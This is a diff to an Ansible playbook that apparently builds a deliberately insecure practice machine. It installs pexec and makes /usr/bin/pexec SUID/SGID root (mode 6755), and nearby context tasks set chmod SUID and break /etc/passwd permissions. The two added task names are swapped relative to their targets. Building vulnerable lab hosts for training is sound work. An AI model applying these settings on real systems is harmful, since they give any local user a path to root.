@@ -72,6 +72,7 @@
           - zip
           - gzip
           - samba
+          - pexec
 
     - name: The Real Backdoor are the E1 Instructors
       ansible.builtin.user:
@@ -190,11 +191,17 @@
     
     - name: SUID chmod
       ansible.builtin.file:
+        path: /usr/bin/pexec
+        owner: root
+        group: root
+        mode: '6755'
+        
+    - name: SUID pexec
+      ansible.builtin.file:
         path: /usr/bin/chmod
         owner: root
         group: root
         mode: '6755'
-    
     - name: Break /etc/passwd Permissions
       ansible.builtin.file:
         path: /etc/passwd
